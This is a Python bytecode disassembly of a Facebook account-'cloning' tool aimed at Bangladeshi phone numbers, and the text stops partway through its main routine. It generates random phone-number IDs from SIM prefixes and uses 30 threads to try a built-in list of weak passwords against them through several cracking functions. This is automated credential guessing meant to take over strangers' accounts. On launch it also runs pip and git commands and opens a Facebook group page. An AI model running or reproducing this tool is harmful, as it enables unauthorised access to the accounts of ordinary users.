  0           0 RESUME                   0

  2           2 LOAD_CONST               0 (0)
              4 LOAD_CONST               1 (None)
              6 IMPORT_NAME              0 (os)
              8 STORE_NAME               0 (os)

  3          10 LOAD_CONST               0 (0)
             12 LOAD_CONST               2 (('system',))
             14 IMPORT_NAME              0 (os)
             16 IMPORT_FROM              1 (system)
             18 STORE_NAME               2 (clr)
             20 POP_TOP

  4          22 LOAD_CONST               0 (0)
             24 LOAD_CONST               1 (None)
             26 IMPORT_NAME              3 (random)
             28 STORE_NAME               3 (random)

  5          30 LOAD_CONST               0 (0)
             32 LOAD_CONST               1 (None)
             34 IMPORT_NAME              4 (string)
             36 STORE_NAME               4 (string)

  6          38 LOAD_CONST               0 (0)
             40 LOAD_CONST               3 (('ThreadPoolExecutor',))
             42 IMPORT_NAME              5 (concurrent.futures)
             44 IMPORT_FROM              6 (ThreadPoolExecutor)
             46 STORE_NAME               7 (tred)
             48 POP_TOP

  7          50 LOAD_CONST               0 (0)
             52 LOAD_CONST               4 (('BeautifulSoup',))
             54 IMPORT_NAME              8 (bs4)
             56 IMPORT_FROM              9 (BeautifulSoup)
             58 STORE_NAME              10 (bxx)
             60 POP_TOP

  8          62 LOAD_CONST               0 (0)
             64 LOAD_CONST               1 (None)
             66 IMPORT_NAME             11 (requests)
             68 STORE_NAME              11 (requests)

  9          70 LOAD_CONST               0 (0)
             72 LOAD_CONST               1 (None)
             74 IMPORT_NAME             12 (re)
             76 STORE_NAME              12 (re)

 10          78 LOAD_CONST               0 (0)
             80 LOAD_CONST               1 (None)
             82 IMPORT_NAME             13 (sys)
             84 STORE_NAME              13 (sys)

 11          86 LOAD_CONST               0 (0)
             88 LOAD_CONST               1 (None)
             90 IMPORT_NAME             14 (uuid)
             92 STORE_NAME              14 (uuid)

 12          94 LOAD_CONST               0 (0)
             96 LOAD_CONST               1 (None)
             98 IMPORT_NAME             15 (json)
            100 STORE_NAME              15 (json)

 13         102 PUSH_NULL
            104 LOAD_NAME                0 (os)
            106 LOAD_ATTR                1 (system)
            116 LOAD_CONST               5 ('pip uninstall requests -y')
            118 PRECALL                  1
            122 CALL                     1
            132 POP_TOP

 14         134 PUSH_NULL
            136 LOAD_NAME                0 (os)
            138 LOAD_ATTR                1 (system)
            148 LOAD_CONST               6 ('pip install requests')
            150 PRECALL                  1
            154 CALL                     1
            164 POP_TOP

 15         166 PUSH_NULL
            168 LOAD_NAME                0 (os)
            170 LOAD_ATTR                1 (system)
            180 LOAD_CONST               7 ('git pull')
            182 PRECALL                  1
            186 CALL                     1
            196 POP_TOP

 16         198 LOAD_CONST               8 ('\x1b[1;30m')
            200 STORE_NAME              16 (bblack)

 17         202 LOAD_CONST               9 ('\x1b[1;31m')
            204 STORE_NAME              17 (M)

 18         206 LOAD_CONST              10 ('\x1b[1;32m')
            208 STORE_NAME              18 (H)

 19         210 LOAD_CONST              11 ('\x1b[1;33m')
            212 STORE_NAME              19 (byellow)

 20         214 LOAD_CONST              12 ('\x1b[1;34m')
            216 STORE_NAME              20 (bblue)

 21         218 LOAD_CONST              13 ('\x1b[1;35m')
            220 STORE_NAME              21 (P)

 22         222 LOAD_CONST              14 ('\x1b[1;36m')
            224 STORE_NAME              22 (C)

 23         226 LOAD_CONST              15 ('\x1b[1;37m')
            228 STORE_NAME              23 (B)

 25         230 LOAD_NAME               23 (B)
            232 LOAD_NAME               22 (C)
            234 LOAD_NAME               21 (P)
            236 LOAD_NAME               18 (H)

 24         238 BUILD_LIST               4
            240 STORE_NAME              24 (my_color)

 26         242 PUSH_NULL
            244 LOAD_NAME                3 (random)
            246 LOAD_ATTR               25 (choice)
            256 LOAD_NAME               24 (my_color)
            258 PRECALL                  1
            262 CALL                     1
            272 STORE_NAME              26 (warna)

 27         274 BUILD_LIST               0
            276 STORE_GLOBAL            27 (oks)

 28         278 BUILD_LIST               0
            280 STORE_GLOBAL            28 (cps)

 29         282 LOAD_CONST               0 (0)
            284 STORE_GLOBAL            29 (loop)

 30         286 PUSH_NULL
            288 LOAD_NAME               11 (requests)
            290 LOAD_ATTR               30 (get)
            300 LOAD_CONST              16 ('http://ip-api.com/json/')
            302 PRECALL                  1
            306 CALL                     1
            316 LOAD_METHOD             15 (json)
            338 PRECALL                  0
            342 CALL                     0
            352 LOAD_CONST              17 ('country')
            354 BINARY_SUBSCR
            364 STORE_NAME              31 (country)

 31         366 PUSH_NULL
            368 LOAD_NAME                0 (os)
            370 LOAD_ATTR                1 (system)
            380 LOAD_CONST              18 ('xdg-open https://facebook.com/groups/551365756758487/')
            382 PRECALL                  1
            386 CALL                     1
            396 POP_TOP

 32         398 LOAD_CONST              19 ('  \x1b[38;5;46m\n╦ ╦╔═╗╔═╗╔═╗╔╗╔  ╔╦╗╔═╗╦═╗╔╦╗╦ ╦═╗ ╦  ╦ ╦╔═╗╦  ╔═╗╦╔╗╔╔═╗  ╔═╗╔═╗╔╗╔╔═╗\n╠═╣╠═╣╚═╗╠═╣║║║   ║ ║╣ ╠╦╝║║║║ ║╔╩╦╝  ╠═╣║╣ ║  ╠═╝║║║║║ ╦  ╔═╝║ ║║║║║╣ \n╩ ╩╩ ╩╚═╝╩ ╩╝╚╝   ╩ ╚═╝╩╚═╩ ╩╚═╝╩ ╚═  ╩ ╩╚═╝╩═╝╩  ╩╝╚╝╚═╝  ╚═╝╚═╝╝╚╝╚═╝\n\x1b[38;5;195m╔═════════════════════════════════════════════════════════════════════╗\n\x1b[38;5;195m║ \x1b[38;5;46mASRAFUL ISLAM HASAN \x1b[1;93m•\x1b[38;5;46m GITHUB KgHasan \x1b[1;93m•\x1b[38;5;46m VARSION 0.0.1 \x1b[1;93m•\x1b[38;5;46m FB ID Hasa N \x1b[38;5;195m║\n\x1b[38;5;195m╚═════════════════════════════════════════════════════════════════════╝\n ')
            400 STORE_NAME              32 (logo)

 40         402 LOAD_CONST              20 (<code object linex2 at 0x7ecf712d91b0, file " ", line 40>)
            404 MAKE_FUNCTION            0
            406 STORE_NAME              33 (linex2)

 42         408 LOAD_CONST              21 (<code object linex1 at 0x7ecf712d8ff0, file " ", line 42>)
            410 MAKE_FUNCTION            0
            412 STORE_NAME              34 (linex1)

 44         414 LOAD_CONST              22 (<code object linex at 0x7ecf712d9d10, file " ", line 44>)
            416 MAKE_FUNCTION            0
            418 STORE_NAME              35 (linex)

 46         420 LOAD_CONST              23 (<code object clear at 0x7ecf71442bc0, file " ", line 46>)
            422 MAKE_FUNCTION            0
            424 STORE_NAME              36 (clear)

 48         426 LOAD_CONST              24 (<code object MAHI_ISLAM at 0x7ecf716fc880, file " ", line 48>)
            428 MAKE_FUNCTION            0
            430 STORE_NAME              37 (MAHI_ISLAM)

 63         432 LOAD_CONST              25 (<code object BD_NORMAL at 0x7ecf71704800, file " ", line 63>)
            434 MAKE_FUNCTION            0
            436 STORE_NAME              38 (BD_NORMAL)

127         438 LOAD_CONST              26 (<code object hasan01 at 0x7ecf714c5a30, file " ", line 127>)
            440 MAKE_FUNCTION            0
            442 STORE_NAME              39 (hasan01)

131         444 LOAD_CONST              27 (<code object hasan02 at 0x7ecf714c5ca0, file " ", line 131>)
            446 MAKE_FUNCTION            0
            448 STORE_NAME              40 (hasan02)

135         450 LOAD_CONST              28 (<code object hasan03 at 0x7ecf714c6250, file " ", line 135>)
            452 MAKE_FUNCTION            0
            454 STORE_NAME              41 (hasan03)

138         456 LOAD_CONST              29 (<code object VENOM_UA at 0x7ecf71057780, file " ", line 138>)
            458 MAKE_FUNCTION            0
            460 STORE_NAME              42 (VENOM_UA)

147         462 LOAD_CONST              30 (<code object HASAN_UA at 0x7ecf714c63f0, file " ", line 147>)
            464 MAKE_FUNCTION            0
            466 STORE_NAME              43 (HASAN_UA)

150         468 LOAD_CONST              31 (<code object method_crack at 0x7ecf7101d400, file " ", line 150>)
            470 MAKE_FUNCTION            0
            472 STORE_NAME              44 (method_crack)

189         474 LOAD_CONST              32 (<code object lock_check at 0x7ecf712f9f70, file " ", line 189>)
            476 MAKE_FUNCTION            0
            478 STORE_NAME              45 (lock_check)

200         480 LOAD_CONST              33 (<code object asraful at 0x7ecf7104e000, file " ", line 200>)
            482 MAKE_FUNCTION            0
            484 STORE_NAME              46 (asraful)

239         486 LOAD_CONST              34 (<code object paki at 0x7ecf7104ec00, file " ", line 239>)
            488 MAKE_FUNCTION            0
            490 STORE_NAME              47 (paki)

278         492 LOAD_CONST              35 (<code object nasir at 0x7ecf7104f800, file " ", line 278>)
            494 MAKE_FUNCTION            0
            496 STORE_NAME              48 (nasir)

316         498 PUSH_NULL
            500 LOAD_NAME               37 (MAHI_ISLAM)
            502 PRECALL                  0
            506 CALL                     0
            516 POP_TOP
            518 LOAD_CONST               1 (None)
            520 RETURN_VALUE

Disassembly of <code object linex2 at 0x7ecf712d91b0, file " ", line 40>:
 40           0 RESUME                   0

 41           2 LOAD_GLOBAL              1 (NULL + print)
             14 LOAD_CONST               1 ('\x1b[38;5;195m╚═════════════════════════════════════════════════════════════════════╝')
             16 PRECALL                  1
             20 CALL                     1
             30 POP_TOP
             32 LOAD_CONST               0 (None)
             34 RETURN_VALUE

Disassembly of <code object linex1 at 0x7ecf712d8ff0, file " ", line 42>:
 42           0 RESUME                   0

 43           2 LOAD_GLOBAL              1 (NULL + print)
             14 LOAD_CONST               1 ('\x1b[38;5;195m╔═════════════════════════════════════════════════════════════════════╗')
             16 PRECALL                  1
             20 CALL                     1
             30 POP_TOP
             32 LOAD_CONST               0 (None)
             34 RETURN_VALUE

Disassembly of <code object linex at 0x7ecf712d9d10, file " ", line 44>:
 44           0 RESUME                   0

 45           2 LOAD_GLOBAL              1 (NULL + print)
             14 LOAD_CONST               1 ('\x1b[1;94m ═════════════════════════════════════════════════════════════════════')
             16 PRECALL                  1
             20 CALL                     1
             30 POP_TOP
             32 LOAD_CONST               0 (None)
             34 RETURN_VALUE

Disassembly of <code object clear at 0x7ecf71442bc0, file " ", line 46>:
 46           0 RESUME                   0

 47           2 LOAD_GLOBAL              1 (NULL + clr)
             14 LOAD_CONST               1 ('clear')
             16 PRECALL                  1
             20 CALL                     1
             30 POP_TOP
             32 LOAD_GLOBAL              3 (NULL + print)
             44 LOAD_GLOBAL              4 (logo)
             56 PRECALL                  1
             60 CALL                     1
             70 POP_TOP
             72 LOAD_CONST               0 (None)
             74 RETURN_VALUE

Disassembly of <code object MAHI_ISLAM at 0x7ecf716fc880, file " ", line 48>:
 48           0 RESUME                   0

 49           2 LOAD_GLOBAL              1 (NULL + clear)
             14 PRECALL                  0
             18 CALL                     0
             28 POP_TOP

 50          30 LOAD_GLOBAL              3 (NULL + os)
             42 LOAD_ATTR                2 (system)
             52 LOAD_CONST               1 ('xdg-open https://facebook.com/groups/551365756758487/')
             54 PRECALL                  1
             58 CALL                     1
             68 POP_TOP

 51          70 LOAD_GLOBAL              7 (NULL + linex1)
             82 PRECALL                  0
             86 CALL                     0
             96 POP_TOP

 52          98 LOAD_GLOBAL              9 (NULL + print)
            110 LOAD_CONST               2 ('\x1b[38;5;195m║\x1b[38;5;196m[\x1b[38;5;192m1\x1b[38;5;196m]\x1b[38;5;46m RANDOM CLONING ')
            112 PRECALL                  1
            116 CALL                     1
            126 POP_TOP

 53         128 LOAD_GLOBAL              9 (NULL + print)
            140 LOAD_CONST               3 ('\x1b[38;5;195m║\x1b[38;5;196m[\x1b[38;5;192m2\x1b[38;5;196m]\x1b[38;5;46m CONTACT ADMIN')
            142 PRECALL                  1
            146 CALL                     1
            156 POP_TOP

 54         158 LOAD_GLOBAL              9 (NULL + print)
            170 LOAD_CONST               4 ('\x1b[38;5;195m║\x1b[38;5;196m[\x1b[38;5;192m0\x1b[38;5;196m]\x1b[38;5;46m EXIT ')
            172 PRECALL                  1
            176 CALL                     1
            186 POP_TOP

 55         188 LOAD_GLOBAL             11 (NULL + linex2)
            200 PRECALL                  0
            204 CALL                     0
            214 POP_TOP

 56         216 LOAD_GLOBAL             13 (NULL + input)
            228 LOAD_CONST               5 (' \x1b[38;5;196m[\x1b[38;5;192m✓\x1b[38;5;196m]\x1b[38;5;46m CHOICE OPTION \x1b[38;5;196m:\x1b[38;5;46m ')
            230 PRECALL                  1
            234 CALL                     1
            244 STORE_FAST               0 (asha)

 57         246 LOAD_FAST                0 (asha)
            248 LOAD_CONST               6 (('01', '1'))
            250 CONTAINS_OP              0
            252 POP_JUMP_FORWARD_IF_FALSE    14 (to 282)

 58         254 LOAD_GLOBAL             15 (NULL + BD_NORMAL)
            266 PRECALL                  0
            270 CALL                     0
            280 POP_TOP

 59     >>  282 LOAD_FAST                0 (asha)
            284 LOAD_CONST               7 (('02', '2'))
            286 CONTAINS_OP              0
            288 POP_JUMP_FORWARD_IF_FALSE    22 (to 334)

 60         290 LOAD_GLOBAL              3 (NULL + os)
            302 LOAD_ATTR                2 (system)
            312 LOAD_CONST               8 ('xdg-open https://www.facebook.com/profile.php?id=100090740779812')
            314 PRECALL                  1
            318 CALL                     1
            328 POP_TOP
            330 LOAD_CONST               0 (None)
            332 RETURN_VALUE

 62     >>  334 LOAD_GLOBAL             17 (NULL + exit)
            346 LOAD_CONST               9 (' Thanks for using dear :)')
            348 PRECALL                  1
            352 CALL                     1
            362 POP_TOP
            364 LOAD_CONST               0 (None)
            366 RETURN_VALUE

Disassembly of <code object BD_NORMAL at 0x7ecf71704800, file " ", line 63>:
 63           0 RESUME                   0

 64           2 BUILD_LIST               0
              4 STORE_FAST               0 (user)

 65           6 LOAD_GLOBAL              1 (NULL + clear)
             18 PRECALL                  0
             22 CALL                     0
             32 POP_TOP

 66          34 LOAD_GLOBAL              3 (NULL + linex1)
             46 PRECALL                  0
             50 CALL                     0
             60 POP_TOP

 67          62 LOAD_GLOBAL              5 (NULL + print)
             74 LOAD_CONST               1 ('\x1b[38;5;195m║\x1b[38;5;196m[\x1b[38;5;192m✓\x1b[38;5;196m]\x1b[38;5;46m EXAMPLE SIM CODE \x1b[38;5;196m: \x1b[38;5;45m017 / 018 / 019 / 016 ')
             76 PRECALL                  1
             80 CALL                     1
             90 POP_TOP

 68          92 LOAD_GLOBAL              7 (NULL + linex2)
            104 PRECALL                  0
            108 CALL                     0
            118 POP_TOP

 69         120 LOAD_GLOBAL              9 (NULL + input)
            132 LOAD_CONST               2 (' \x1b[38;5;196m[\x1b[38;5;192m✓\x1b[38;5;196m]\x1b[38;5;46mCHOICE YOUR CODE \x1b[38;5;196m: \x1b[38;5;46m')
            134 PRECALL                  1
            138 CALL                     1
            148 STORE_FAST               1 (code)

 70         150 LOAD_GLOBAL             11 (NULL + os)
            162 LOAD_ATTR                6 (system)
            172 LOAD_CONST               3 ('clear')
            174 PRECALL                  1
            178 CALL                     1
            188 POP_TOP
            190 LOAD_GLOBAL              5 (NULL + print)
            202 LOAD_GLOBAL             14 (logo)
            214 PRECALL                  1
            218 CALL                     1
            228 POP_TOP
            230 LOAD_GLOBAL              3 (NULL + linex1)
            242 PRECALL                  0
            246 CALL                     0
            256 POP_TOP

 71         258 LOAD_GLOBAL              5 (NULL + print)
            270 LOAD_CONST               4 ('\x1b[38;5;195m║\x1b[38;5;196m[\x1b[38;5;192m1\x1b[38;5;196m]\x1b[38;5;46m BD RANDOM CLONE \x1b[38;5;196m[\x1b[38;5;192mBEST\x1b[38;5;196m]\x1b[38;5;46m-\x1b[38;5;196m[\x1b[38;5;192mM1\x1b[38;5;196m] \n\x1b[38;5;195m║\x1b[38;5;196m[\x1b[38;5;192m2\x1b[38;5;196m]\x1b[38;5;46m BD RANDOM CLONE \x1b[38;5;196m[\x1b[38;5;192mNORMAL\x1b[38;5;196m]\x1b[38;5;46m-\x1b[38;5;196m[\x1b[38;5;192mM2\x1b[38;5;196m]\n\x1b[38;5;195m║\x1b[38;5;196m[\x1b[38;5;192m3\x1b[38;5;196m]\x1b[38;5;46m BD RANDOM CLONE \x1b[38;5;196m[\x1b[38;5;192mBEST\x1b[38;5;196m]\x1b[38;5;46m-\x1b[38;5;196m[\x1b[38;5;192mM3\x1b[38;5;196m]\n\x1b[38;5;195m║\x1b[38;5;196m[\x1b[38;5;192m4\x1b[38;5;196m]\x1b[38;5;46m BD RANDOM CLONE \x1b[38;5;196m[\x1b[38;5;192mBEST\x1b[38;5;196m]\x1b[38;5;46m-\x1b[38;5;196m[\x1b[38;5;192mM4\x1b[38;5;196m]\n\x1b[38;5;195m║\x1b[38;5;196m[\x1b[38;5;192m0\x1b[38;5;196m]\x1b[38;5;46m MAIN MENU\n\x1b[38;5;195m╚═════════════════════════════════════════════════════════════════════╝')
            272 PRECALL                  1
            276 CALL                     1
            286 POP_TOP

 72         288 LOAD_GLOBAL              9 (NULL + input)
            300 LOAD_CONST               5 (' \x1b[38;5;196m[\x1b[38;5;192m✓\x1b[38;5;196m]\x1b[38;5;46m CHOICE MATHOID \x1b[38;5;196m\x1b[38;5;196m: \x1b[38;5;46m')
            302 PRECALL                  1
            306 CALL                     1
            316 STORE_FAST               2 (ha)

 73         318 BUILD_LIST               0
            320 STORE_FAST               3 (nabil)

 74         322 LOAD_FAST                2 (ha)
            324 LOAD_CONST               6 (('1', '01'))
            326 CONTAINS_OP              0
            328 POP_JUMP_FORWARD_IF_FALSE    21 (to 372)

 75         330 LOAD_FAST                3 (nabil)
            332 LOAD_METHOD              8 (append)
            354 LOAD_CONST               7 ('M1')
            356 PRECALL                  1
            360 CALL                     1
            370 POP_TOP

 76     >>  372 LOAD_FAST                2 (ha)
            374 LOAD_CONST               8 (('2', '02'))
            376 CONTAINS_OP              0
            378 POP_JUMP_FORWARD_IF_FALSE    21 (to 422)

 77         380 LOAD_FAST                3 (nabil)
            382 LOAD_METHOD              8 (append)
            404 LOAD_CONST               9 ('M2')
            406 PRECALL                  1
            410 CALL                     1
            420 POP_TOP

 78     >>  422 LOAD_FAST                2 (ha)
            424 LOAD_CONST              10 (('3', '03'))
            426 CONTAINS_OP              0
            428 POP_JUMP_FORWARD_IF_FALSE    21 (to 472)

 79         430 LOAD_FAST                3 (nabil)
            432 LOAD_METHOD              8 (append)
            454 LOAD_CONST              11 ('M3')
            456 PRECALL                  1
            460 CALL                     1
            470 POP_TOP

 80     >>  472 LOAD_FAST                2 (ha)
            474 LOAD_CONST              12 (('4', '04'))
            476 CONTAINS_OP              0
            478 POP_JUMP_FORWARD_IF_FALSE    21 (to 522)

 81         480 LOAD_FAST                3 (nabil)
            482 LOAD_METHOD              8 (append)
            504 LOAD_CONST              13 ('M4')
            506 PRECALL                  1
            510 CALL                     1
            520 POP_TOP

 82     >>  522 LOAD_FAST                2 (ha)
            524 LOAD_CONST              14 (('0', '00'))
            526 CONTAINS_OP              0
            528 POP_JUMP_FORWARD_IF_FALSE    16 (to 562)

 83         530 LOAD_GLOBAL             19 (NULL + exit)
            542 LOAD_CONST              15 ('\x1b[38;5;46m THANKS USING MY TOOLS')
            544 PRECALL                  1
            548 CALL                     1
            558 POP_TOP
            560 JUMP_FORWARD            21 (to 604)

 85     >>  562 LOAD_FAST                3 (nabil)
            564 LOAD_METHOD              8 (append)
            586 LOAD_CONST               7 ('M1')
            588 PRECALL                  1
            592 CALL                     1
            602 POP_TOP

 86     >>  604 LOAD_GLOBAL              3 (NULL + linex1)
            616 PRECALL                  0
            620 CALL                     0
            630 POP_TOP

 87         632 LOAD_GLOBAL              5 (NULL + print)
            644 LOAD_CONST              16 ('\x1b[38;5;195m║\x1b[38;5;196m[\x1b[38;5;192m✓\x1b[38;5;196m]\x1b[38;5;46m EXAMPLE LIMIT \x1b[38;5;196m: \x1b[38;5;45m 2000 / 5000 / 10000 ')
            646 PRECALL                  1
            650 CALL                     1
            660 POP_TOP

 88         662 LOAD_GLOBAL              7 (NULL + linex2)
            674 PRECALL                  0
            678 CALL                     0
            688 POP_TOP

 89         690 NOP

 90         692 LOAD_GLOBAL             21 (NULL + int)
            704 LOAD_GLOBAL              9 (NULL + input)
            716 LOAD_CONST              17 (' \x1b[38;5;196m[\x1b[38;5;192m✓\x1b[38;5;196m]\x1b[38;5;46mENTER LIMIT \x1b[38;5;196m: \x1b[38;5;46m')
            718 PRECALL                  1
            722 CALL                     1
            732 PRECALL                  1
            736 CALL                     1
            746 STORE_FAST               4 (limit)
            748 JUMP_FORWARD            18 (to 786)
        >>  750 PUSH_EXC_INFO

 91         752 LOAD_GLOBAL             22 (ValueError)
            764 CHECK_EXC_MATCH
            766 POP_JUMP_FORWARD_IF_FALSE     5 (to 778)
            768 POP_TOP

 92         770 LOAD_CONST              18 (50000)
            772 STORE_FAST               4 (limit)
            774 POP_EXCEPT
            776 JUMP_FORWARD             4 (to 786)

 91     >>  778 RERAISE                  0
        >>  780 COPY                     3
            782 POP_EXCEPT
            784 RERAISE                  1

 93     >>  786 LOAD_GLOBAL              1 (NULL + clear)
            798 PRECALL                  0
            802 CALL                     0
            812 POP_TOP

 94         814 LOAD_GLOBAL             25 (NULL + range)
            826 LOAD_FAST                4 (limit)
            828 PRECALL                  1
            832 CALL                     1
            842 GET_ITER
        >>  844 FOR_ITER                67 (to 980)
            846 STORE_FAST               5 (nmbr)

 95         848 LOAD_CONST              19 ('')
            850 LOAD_METHOD             13 (join)
            872 LOAD_CONST              20 (<code object <genexpr> at 0x7ecf71443440, file " ", line 95>)
            874 MAKE_FUNCTION            0
            876 LOAD_GLOBAL             25 (NULL + range)
            888 LOAD_CONST              21 (8)
            890 PRECALL                  1
            894 CALL                     1
            904 GET_ITER
            906 PRECALL                  0
            910 CALL                     0
            920 PRECALL                  1
            924 CALL                     1
            934 STORE_FAST               6 (nmp)

 96         936 LOAD_FAST                0 (user)
            938 LOAD_METHOD              8 (append)
            960 LOAD_FAST                6 (nmp)
            962 PRECALL                  1
            966 CALL                     1
            976 POP_TOP
            978 JUMP_BACKWARD           68 (to 844)

 97     >>  980 LOAD_GLOBAL             29 (NULL + tred)
            992 LOAD_CONST              22 (30)
            994 KW_NAMES                23
            996 PRECALL                  1
           1000 CALL                     1
           1010 BEFORE_WITH
           1012 STORE_FAST               7 (Tahrima)

 98        1014 LOAD_GLOBAL             31 (NULL + str)
           1026 LOAD_GLOBAL             33 (NULL + len)
           1038 LOAD_FAST                0 (user)
           1040 PRECALL                  1
           1044 CALL                     1
           1054 PRECALL                  1
           1058 CALL                     1
           1068 STORE_FAST               8 (tl)

 99        1070 LOAD_GLOBAL              3 (NULL + linex1)
           1082 PRECALL                  0
           1086 CALL                     0
           1096 POP_TOP

100        1098 LOAD_FAST                3 (nabil)
           1100 LOAD_CONST              24 (0)
           1102 BINARY_SUBSCR
           1112 STORE_FAST               9 (kadija)

101        1114 LOAD_GLOBAL              5 (NULL + print)
           1126 LOAD_CONST              25 ('\x1b[38;5;195m║\x1b[38;5;196m[\x1b[38;5;192m✓\x1b[38;5;196m]\x1b[38;5;46m YOUR COUNTRY \x1b[38;5;196m:\x1b[38;5;46m ')
           1128 LOAD_GLOBAL             34 (country)
           1140 BINARY_OP                0 (+)
           1144 PRECALL                  1
           1148 CALL                     1
           1158 POP_TOP

102        1160 LOAD_GLOBAL              5 (NULL + print)
           1172 LOAD_CONST              26 ('\x1b[38;5;195m║\x1b[38;5;196m[\x1b[38;5;192m✓\x1b[38;5;196m]\x1b[38;5;46m YOUR MATHOID \x1b[38;5;196m:\x1b[38;5;46m ')
           1174 LOAD_FAST                9 (kadija)
           1176 BINARY_OP                0 (+)
           1180 PRECALL                  1
           1184 CALL                     1
           1194 POP_TOP

103        1196 LOAD_GLOBAL              5 (NULL + print)
           1208 LOAD_CONST              27 ('\x1b[38;5;195m║\x1b[38;5;196m[\x1b[38;5;192m✓\x1b[38;5;196m]\x1b[38;5;46m TOTAL ACCOUNT \x1b[38;5;196m:\x1b[38;5;46m ')
           1210 LOAD_FAST                8 (tl)
           1212 BINARY_OP                0 (+)
           1216 PRECALL                  1
           1220 CALL                     1
           1230 POP_TOP

104        1232 LOAD_GLOBAL              5 (NULL + print)
           1244 LOAD_CONST              28 ('\x1b[38;5;195m║\x1b[38;5;196m[\x1b[38;5;192m✓\x1b[38;5;196m]\x1b[38;5;46m YOUR SIM CODE\x1b[38;5;196m :\x1b[38;5;46m ')
           1246 LOAD_FAST                1 (code)
           1248 BINARY_OP                0 (+)
           1252 PRECALL                  1
           1256 CALL                     1
           1266 POP_TOP

105        1268 LOAD_GLOBAL              7 (NULL + linex2)
           1280 PRECALL                  0
           1284 CALL                     0
           1294 POP_TOP

106        1296 LOAD_FAST                0 (user)
           1298 GET_ITER
        >> 1300 FOR_ITER               197 (to 1696)
           1302 STORE_FAST              10 (psx)

107        1304 LOAD_FAST                1 (code)
           1306 LOAD_FAST               10 (psx)
           1308 BINARY_OP                0 (+)
           1312 STORE_FAST              11 (ids)

108        1314 LOAD_FAST               10 (psx)
           1316 LOAD_FAST               11 (ids)
           1318 LOAD_FAST               11 (ids)
           1320 LOAD_CONST               0 (None)
           1322 LOAD_CONST              29 (7)
           1324 BUILD_SLICE              2
           1326 BINARY_SUBSCR
           1336 LOAD_FAST               11 (ids)
           1338 LOAD_CONST               0 (None)
           1340 LOAD_CONST              30 (6)
           1342 BUILD_SLICE              2
           1344 BINARY_SUBSCR
           1354 LOAD_FAST               11 (ids)
           1356 LOAD_CONST              31 (5)
           1358 LOAD_CONST               0 (None)
           1360 BUILD_SLICE              2
           1362 BINARY_SUBSCR
           1372 LOAD_FAST               11 (ids)
           1374 LOAD_CONST              32 (4)
           1376 LOAD_CONST               0 (None)
           1378 BUILD_SLICE              2
           1380 BINARY_SUBSCR
           1390 LOAD_CONST              33 ('59039200')
           1392 LOAD_CONST              34 ('bangladesh')
           1394 LOAD_CONST              35 ('mahbuba')
           1396 LOAD_CONST              36 ('i love you')
           1398 LOAD_CONST              37 ('samiya')
           1400 LOAD_CONST              38 ('57273200')
           1402 LOAD_CONST              39 ('sadiya')
           1404 LOAD_CONST              40 ('saiful')
           1406 LOAD_CONST              41 ('alamin')
           1408 LOAD_CONST              42 ('aaabbb')
           1410 LOAD_CONST              43 ('mafiya')
           1412 LOAD_CONST              44 ('jannat')
           1414 LOAD_CONST              45 ('freefire')
           1416 LOAD_CONST              46 ('ff lover')
           1418 LOAD_CONST              47 ('ayesha')
           1420 LOAD_CONST              48 ('sabbir')
           1422 LOAD_CONST              49 ('mahbub')
           1424 LOAD_CONST              50 ('jannatul')
           1426 LOAD_CONST              51 ('mimmim')
           1428 LOAD_CONST              52 ('fatema')
           1430 LOAD_CONST              53 ('nazmul')
           1432 LOAD_CONST              54 ('@@@###')
           1434 BUILD_LIST              28
           1436 STORE_FAST              12 (passlist)

110        1438 LOAD_CONST               7 ('M1')
           1440 LOAD_FAST                3 (nabil)
           1442 CONTAINS_OP              0
           1444 POP_JUMP_FORWARD_IF_FALSE    28 (to 1502)

111        1446 LOAD_FAST                7 (Tahrima)
           1448 LOAD_METHOD             18 (submit)
           1470 LOAD_GLOBAL             38 (method_crack)
           1482 LOAD_FAST               11 (ids)
           1484 LOAD_FAST               12 (passlist)
           1486 PRECALL                  3
           1490 CALL                     3
           1500 POP_TOP

112     >> 1502 LOAD_CONST               9 ('M2')
           1504 LOAD_FAST                3 (nabil)
           1506 CONTAINS_OP              0
           1508 POP_JUMP_FORWARD_IF_FALSE    28 (to 1566)

113        1510 LOAD_FAST                7 (Tahrima)
           1512 LOAD_METHOD             18 (submit)
           1534 LOAD_GLOBAL             40 (asraful)
           1546 LOAD_FAST               11 (ids)
           1548 LOAD_FAST               12 (passlist)
           1550 PRECALL                  3
           1554 CALL                     3
           1564 POP_TOP

114     >> 1566 LOAD_CONST              11 ('M3')
           1568 LOAD_FAST                3 (nabil)
           1570 CONTAINS_OP              0
           1572 POP_JUMP_FORWARD_IF_FALSE    28 (to 1630)

115        1574 LOAD_FAST                7 (Tahrima)
           1576 LOAD_METHOD             18 (submit)
           1598 LOAD_GLOBAL             42 (paki)
           1610 LOAD_FAST               11 (ids)
           1612 LOAD_FAST               12 (passlist)
           1614 PRECALL                  3
           1618 CALL                     3
           1628 POP_TOP

116     >> 1630 LOAD_CONST              13 ('M4')
           1632 LOAD_FAST                3 (nabil)
           1634 CONTAINS_OP              0
           1636 POP_JUMP_FORWARD_IF_FALSE    28 (to 1694)

117        1638 LOAD_FAST                7 (Tahrima)
           1640 LOAD_METHOD             18 (submit)
           1662 LOAD_GLOBAL             44 (nasir)
           1674 LOAD_FAST               11 (ids)
           1676 LOAD_FAST               12 (passlist)
           1678 PRECALL                  3
           1682 CALL                     3
           1692 POP_TOP
        >> 1694 JUMP_BACKWARD          198 (to 1300)

106     >> 1696 NOP

 97        1698 LOAD_CONST               0 (None)
           1700 LOAD_CONST               0 (None)
           1702 LOAD_CONST               0 (None)
           1704 PRECALL                  2
           1708 CALL                     2
           1718 POP_TOP
           1720 JUMP_FORWARD            11 (to 1744)
        >> 1722 PUSH_EXC_INFO
           1724 WITH_EXCEPT_START
           1726 POP_JUMP_FORWARD_IF_TRUE     4 (to 1736)
           1728 RERAISE                  2
        >> 1730 COPY                     3
           1732 POP_EXCEPT
           1734 RERAISE                  1
        >> 1736 POP_TOP
           1738 POP_EXCEPT
           1740 POP_TOP
           1742 POP_TOP

118     >> 1744 LOAD_GLOBAL              3 (NULL + linex1)
           1756 PRECALL                  0
           1760 CALL                     0
           1770 POP_TOP

119        1772 LOAD_GLOBAL              5 (NULL + print)
           1784 LOAD_CONST              55 ('\x1b[38;5;195m║\x1b[38;5;196m[\x1b[38;5;192m✓\x1b[38;5;196m]\x1b[38;5;46m THE PROGRESS HAS BEEN COMPLETE ')
           1786 PRECALL                  1
           1790 CALL                     1
           1800 POP_TOP

120        1802 LOAD_GLOBAL              5 (NULL + print)
